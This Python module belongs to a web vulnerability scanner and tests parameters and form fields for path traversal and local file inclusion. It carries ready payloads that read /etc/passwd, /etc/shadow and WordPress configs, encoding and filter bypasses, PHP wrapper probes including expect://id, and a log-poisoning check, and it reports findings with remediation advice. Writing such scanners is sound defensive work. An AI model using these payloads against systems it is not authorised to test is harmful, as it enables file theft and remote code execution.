"""
PathTraversalTester — Dedicated path traversal / LFI vulnerability detection.
OWASP A01:2021 — Broken Access Control.

Tests for: basic Unix/Windows traversal, URL encoding, double encoding, unicode
overlong encoding, null byte bypass, filter bypass, PHP wrappers, and LFI to
log poisoning chain detection.
"""
import re
import logging
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from .base_tester import BaseTester

logger = logging.getLogger(__name__)

# Parameter names commonly used for file paths
_FILE_PARAM_NAMES = {
    'file', 'path', 'filepath', 'filename', 'page', 'template', 'include',
    'doc', 'document', 'dir', 'folder', 'load', 'read', 'view', 'content',
    'module', 'lang', 'language', 'locale', 'layout', 'theme', 'skin',
    'config', 'conf', 'style', 'stylesheet', 'attachment', 'download',
    'report', 'log', 'src', 'source', 'img', 'image', 'upload',
}

# Detection strings for successful traversal
_LINUX_INDICATORS = [
    'root:x:0:0', 'root:x:0:', '/bin/bash', '/bin/sh', 'daemon:x:',
    'nobody:x:', 'www-data:', '/usr/sbin/nologin',
]
_WINDOWS_INDICATORS = [
    '[extensions]', '[fonts]', 'for 16-bit app support',
    '[mci extensions]', '[files]', '[Mail]',
]

# ── Payload sets organized by bypass type ─────────────────────────────────────

_BASIC_UNIX = [
    '../../etc/passwd',
    '../../../etc/passwd',
    '../../../../etc/passwd',
    '../../../../../etc/passwd',
    '../../../../../../etc/passwd',
    '../../../../../../../etc/passwd',
    '../../etc/shadow',
    '../../../etc/hosts',
    '../../proc/self/environ',
]

_BASIC_WINDOWS = [
    '..\\..\\windows\\win.ini',
    '..\\..\\..\\windows\\win.ini',
    '..\\..\\..\\..\\windows\\win.ini',
    '..\\..\\..\\..\\..\\windows\\win.ini',
    '..\\..\\boot.ini',
]

_URL_ENCODED = [
    '..%2F..%2Fetc%2Fpasswd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
    '..%2F..%2Fwindows%2Fwin.ini',
    '%2E%2E%2F%2E%2E%2Fetc%2Fpasswd',
]

_DOUBLE_ENCODED = [
    '..%252F..%252Fetc%252Fpasswd',
    '..%252F..%252F..%252Fetc%252Fpasswd',
    '%252E%252E%252F%252E%252E%252Fetc%252Fpasswd',
    '..%252F..%252Fwindows%252Fwin.ini',
]

_UNICODE_OVERLONG = [
    '%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
    '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
    '%c0%2e%c0%2e/%c0%2e%c0%2e/etc/passwd',
]

_NULL_BYTE = [
    '../../../etc/passwd%00.jpg',
    '../../../etc/passwd%00.png',
    '../../../etc/passwd%00.html',
    '..\\..\\windows\\win.ini%00.jpg',
]

_FILTER_BYPASS = [
    '....//....//etc/passwd',
    '....//....//....//etc/passwd',
    '..;/..;/etc/passwd',
    '..;/..;/..;/etc/passwd',
    '..\\.\\..\\.\\..\\.\\etc\\passwd',
    '....\\\\....\\\\windows\\\\win.ini',
    '..../....//etc/passwd',
    '..%00/..%00/etc/passwd',
    '..%0d/..%0d/etc/passwd',
    '/..%c0%af..%c0%af..%c0%afetc/passwd',
    '/%5C../%5C../%5C../etc/passwd',
    '..//..//..//etc/passwd',
]

# PHP wrapper payloads (medium+)
_PHP_WRAPPERS = [
    ('php://filter/convert.base64-encode/resource=../config.php',
     'PHP filter base64 encode', 'base64'),
    ('php://filter/convert.base64-encode/resource=../wp-config.php',
     'PHP filter WordPress config', 'base64'),
    ('php://filter/convert.base64-encode/resource=index.php',
     'PHP filter index', 'base64'),
    ('php://input', 'PHP input wrapper', None),
    ('data://text/plain;base64,PD9waHAgZWNobyAiTEZJX1RFU1QiOyA/Pg==',
     'PHP data wrapper', 'LFI_TEST'),
    ('expect://id', 'PHP expect wrapper', 'uid='),
]

# Log file paths for LFI → log poisoning chain (deep)
_LOG_PATHS = [
    '/var/log/apache2/access.log',
    '/var/log/apache2/error.log',
    '/var/log/nginx/access.log',
    '/var/log/nginx/error.log',
    '/var/log/httpd/access_log',
    '/var/log/httpd/error_log',
    '/var/log/syslog',
    '/proc/self/environ',
    '/proc/self/fd/0',
]


class PathTraversalTester(BaseTester):
    """Test for path traversal and Local File Inclusion vulnerabilities."""

    TESTER_NAME = 'PathTraversal'

    def test(self, page, depth: str = 'medium', recon_data: dict = None) -> list:
        vulnerabilities = []

        # Identify file-path parameters
        file_params = [p for p in page.parameters if self._is_file_param(p)]

        # Also check form inputs
        file_form_inputs = []
        for form in page.forms:
            for inp in form.inputs:
                if inp.input_type in ('hidden', 'submit', 'button', 'image'):
                    continue
                if self._is_file_param(inp.name or ''):
                    file_form_inputs.append((form, inp))

        if not file_params and not file_form_inputs:
            return vulnerabilities

        # Build payload list based on depth
        payloads = _BASIC_UNIX + _BASIC_WINDOWS + _URL_ENCODED
        if depth in ('medium', 'deep'):
            payloads += _DOUBLE_ENCODED + _NULL_BYTE + _FILTER_BYPASS + _UNICODE_OVERLONG
        if depth == 'deep':
            payloads += [f'....//....//....//....//..../{p}' for p in
                        ['etc/passwd', 'etc/shadow', 'windows/win.ini']]

        # Apply WAF evasion if needed
        payloads = self._apply_waf_evasion(payloads, recon_data)

        # Test URL parameters
        for param_name in file_params:
            vuln = self._test_traversal_param(page.url, param_name, payloads)
            if vuln:
                vulnerabilities.append(vuln)
                continue

        # Test form inputs
        for form, inp in file_form_inputs:
            vuln = self._test_traversal_form(form, inp, payloads, page.url)
            if vuln:
                vulnerabilities.append(vuln)
                continue

        # Medium+: PHP wrapper probes
        if depth in ('medium', 'deep') and file_params:
            for param_name in file_params:
                vuln = self._test_php_wrappers(page.url, param_name)
                if vuln:
                    vulnerabilities.append(vuln)
                    break

        # Deep: LFI → log poisoning chain
        if depth == 'deep' and file_params:
            for param_name in file_params:
                vuln = self._test_log_poisoning_chain(page.url, param_name)
                if vuln:
                    vulnerabilities.append(vuln)
                    break

        return vulnerabilities

    def _is_file_param(self, param_name):
        """Check if parameter name suggests a file path input."""
        return param_name.lower().strip() in _FILE_PARAM_NAMES

    def _has_traversal_success(self, body):
        """Check if response body contains path traversal success indicators."""
        if not body:
            return False, None
        for indicator in _LINUX_INDICATORS:
            if indicator in body:
                return True, 'Linux'
        for indicator in _WINDOWS_INDICATORS:
            if indicator in body:
                return True, 'Windows'
        return False, None

    def _test_traversal_param(self, url, param_name, payloads):
        """Test URL parameter for path traversal."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for payload in payloads:
            params[param_name] = payload
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                   parsed.params, urlencode(params, doseq=True), ''))
            resp = self._make_request('GET', test_url)
            if not resp:
                continue

            success, os_type = self._has_traversal_success(resp.text or '')
            if success:
                target_file = 'etc/passwd' if os_type == 'Linux' else 'windows/win.ini'
                return self._build_vuln(
                    name=f'Path Traversal in Parameter: {param_name}',
                    severity='high',
                    category='Path Traversal',
                    description=f'The parameter "{param_name}" is vulnerable to path traversal. '
                               f'The server returned contents of a {os_type} system file '
                               f'({target_file}) when a directory traversal payload was supplied.',
                    impact='Attackers can read arbitrary files from the server, including '
                          'configuration files, source code, credentials, and private keys.',
                    remediation='Validate file paths against an allowlist of permitted files. '
                               'Use os.path.realpath() to resolve paths and verify they stay '
                               'within the intended directory. Never use user input directly in '
                               'file system operations.',
                    cwe='CWE-22',
                    cvss=7.5,
                    affected_url=url,
                    evidence=f'Parameter: {param_name}\nPayload: {payload}\n'
                            f'OS: {os_type}\nSystem file content detected in response.',
                )
        return None

    def _test_traversal_form(self, form, inp, payloads, page_url):
        """Test form input for path traversal."""
        for payload in payloads[:20]:  # Limit form tests
            data = {}
            for form_inp in form.inputs:
                if form_inp.name == inp.name:
                    data[form_inp.name] = payload
                else:
                    data[form_inp.name] = form_inp.value or 'test'

            target_url = form.action or page_url
            method = form.method.upper()
            if method == 'POST':
                resp = self._make_request('POST', target_url, data=data)
            else:
                resp = self._make_request('GET', target_url, params=data)

            if not resp:
                continue

            success, os_type = self._has_traversal_success(resp.text or '')
            if success:
                return self._build_vuln(
                    name=f'Path Traversal in Form Field: {inp.name}',
                    severity='high',
                    category='Path Traversal',
                    description=f'The form field "{inp.name}" is vulnerable to path traversal.',
                    impact='Arbitrary file read from the server filesystem.',
                    remediation='Validate and sanitize file path inputs. Use allowlists.',
                    cwe='CWE-22',
                    cvss=7.5,
                    affected_url=target_url,
                    evidence=f'Form: {method} {target_url}\nField: {inp.name}\n'
                            f'Payload: {payload}\nOS: {os_type}',
                )
        return None

    def _test_php_wrappers(self, url, param_name):
        """Test PHP stream wrappers for LFI exploitation."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for wrapper, desc, indicator in _PHP_WRAPPERS:
            params[param_name] = wrapper
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                   parsed.params, urlencode(params, doseq=True), ''))
            resp = self._make_request('GET', test_url)
            if not resp or not resp.text:
                continue

            body = resp.text
            detected = False

            if indicator == 'base64':
                # Check for base64-encoded content (long alphanumeric strings)
                if re.search(r'[A-Za-z0-9+/]{40,}={0,2}', body):
                    detected = True
            elif indicator == 'uid=':
                if 'uid=' in body:
                    detected = True
            elif indicator and indicator in body:
                detected = True
            elif resp.status_code == 200 and len(body) > 200 and 'error' not in body.lower():
                # Generic success: meaningful content returned
                if '<?php' in body or 'function' in body:
                    detected = True

            if detected:
                severity = 'critical' if 'expect://' in wrapper else 'high'
                return self._build_vuln(
                    name=f'PHP Wrapper LFI: {desc}',
                    severity=severity,
                    category='Path Traversal',
                    description=f'The parameter "{param_name}" accepts PHP stream wrappers. '
                               f'The wrapper "{wrapper}" returned meaningful content, '
                               f'indicating LFI via PHP wrapper exploitation.',
                    impact='PHP wrappers can read source code (filter), execute arbitrary PHP '
                          '(input/data), or execute OS commands (expect). This can lead to '
                          'full remote code execution.',
                    remediation='Disable dangerous PHP wrappers in php.ini: allow_url_include=Off, '
                               'allow_url_fopen=Off. Validate file paths strictly.',
                    cwe='CWE-98',
                    cvss=9.8 if 'expect://' in wrapper else 7.5,
                    affected_url=url,
                    evidence=f'Parameter: {param_name}\nWrapper: {wrapper}\n'
                            f'Technique: {desc}\nContent indicators found in response.',
                )
        return None

    def _test_log_poisoning_chain(self, url, param_name):
        """Test for LFI to log poisoning chain (deep only).

        1. Check if log files are readable via traversal
        2. If readable, flag as High (LFI → RCE chain possible)
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        traversal_prefixes = [
            '../../../../../../..',
            '../../../../../../../..',
            '....//....//....//....//....//....//...',
        ]

        for log_path in _LOG_PATHS:
            for prefix in traversal_prefixes:
                payload = prefix + log_path
                params[param_name] = payload
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                       parsed.params, urlencode(params, doseq=True), ''))
                resp = self._make_request('GET', test_url)
                if not resp or not resp.text:
                    continue

                body = resp.text
                # Check for log file indicators
                log_indicators = ['GET /', 'POST /', 'HTTP/1.', 'Mozilla/',
                                 '[error]', '[warn]', 'PHP Fatal',
                                 'uid=', 'USER=', 'HOME=/']
                if any(ind in body for ind in log_indicators):
                    return self._build_vuln(
                        name=f'LFI Log File Access: {log_path}',
                        severity='high',
                        category='Path Traversal',
                        description=f'The parameter "{param_name}" can read server log files '
                                   f'via path traversal. Access to "{log_path}" was confirmed. '
                                   f'This enables an LFI → Log Poisoning → RCE attack chain.',
                        impact='An attacker can: 1) Inject PHP code into logs via User-Agent or '
                              'Referer headers, 2) Include the poisoned log file via LFI, '
                              '3) Achieve Remote Code Execution. Critical severity chain.',
                        remediation='Fix the path traversal vulnerability. Restrict log file '
                                   'permissions. Move logs outside the web-accessible directory. '
                                   'Use a centralized log management system.',
                        cwe='CWE-22',
                        cvss=8.6,
                        affected_url=url,
                        evidence=f'Parameter: {param_name}\nLog file: {log_path}\n'
                                f'Payload: {payload}\n'
                                f'Log content indicators found in response.',
                    )
        return None
